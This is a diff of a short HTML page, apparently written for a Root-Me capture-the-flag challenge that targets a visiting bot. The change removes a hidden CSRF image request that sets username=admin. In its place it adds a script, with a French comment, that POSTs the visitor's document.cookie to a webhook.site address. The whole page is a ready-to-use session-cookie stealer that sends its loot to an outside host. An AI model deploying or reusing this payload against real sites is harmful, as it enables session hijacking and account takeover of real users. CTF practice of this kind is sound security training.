@@ -2,10 +2,16 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Bot CSRF Attack</title>
+    <title>Bot Trap</title>
 </head>
 <body>
-    <h1>Redirecting Bot...</h1>
-    <img src="https://cache-cache-1.challenges.pro.root-me.org/?username=admin" style="display:none">
+    <h1>Hello, Bot!</h1>
+    <script>
+        // Envoie les cookies du bot vers ton webhook
+        fetch('https://webhook.site/TON_ID_UNIQUE', {
+            method: 'POST',
+            body: document.cookie
+        });
+    </script>
 </body>
 </html>
